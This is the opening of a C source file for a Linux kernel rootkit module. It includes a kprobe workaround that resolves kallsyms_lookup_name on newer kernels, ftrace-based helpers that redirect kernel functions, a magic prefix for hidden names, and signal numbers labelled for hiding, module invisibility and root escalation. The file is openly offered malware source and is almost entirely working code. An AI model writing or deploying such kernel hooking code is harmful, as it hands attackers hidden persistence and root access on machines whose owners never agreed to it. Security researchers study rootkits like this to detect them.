#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

// magic prefix
#define PREFIX "br0k3_n0w_h1dd3n"

// comment this macro in real senary
#define DEBUG

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
#endif

#define HOOK(_name, _hook, _orig) \
  { .name = (_name), .function = (_hook), .original = (_orig), }

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
  const char *name;
  void *function;
  void *original;

  unsigned long address;
  struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
#endif
  hook->address = kallsyms_lookup_name(hook->name);

  if (!hook->address) {
#ifdef DEBUG
    printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
#endif
    return -ENOENT;
  }

#if USE_FENTRY_OFFSET
  *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
  *((unsigned long *)hook->original) = hook->address;
#endif

  return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct pt_regs *regs) {
  struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
  regs->ip = (unsigned long)hook->function;
#else
  if (!within_module(parent_ip, THIS_MODULE))
    regs->ip = (unsigned long)hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook) {
  int err;
  err = fh_resolve_hook_address(hook);
  if (err) return err;

  hook->ops.func = fh_ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                    FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
#endif
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
#endif
    return err;
  }

  return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
  int err;
  err = unregister_ftrace_function(&hook->ops);
#ifdef DEBUG
  if (err) {
    printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n",
           err);
  }
#endif

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
  if (err) {
#ifdef DEBUG
    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
#endif
  }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
  int err;
  size_t i;

  for (i = 0; i < count; i++) {
    err = fh_install_hook(&hooks[i]);
    if (err) goto error;
  }
  return 0;

error:
  while (i != 0) {
    fh_remove_hook(&hooks[--i]);
  }
  return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
  size_t i;

  for (i = 0; i < count; i++) fh_remove_hook(&hooks[i]);
}

enum {
  SIGHIDE = 31,
  SIGMODINVIS = 63,
  SIGROOT = 64,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
  (defined(__enabled_##option) || defined(__enabled_##option##_MODULE))
#endif
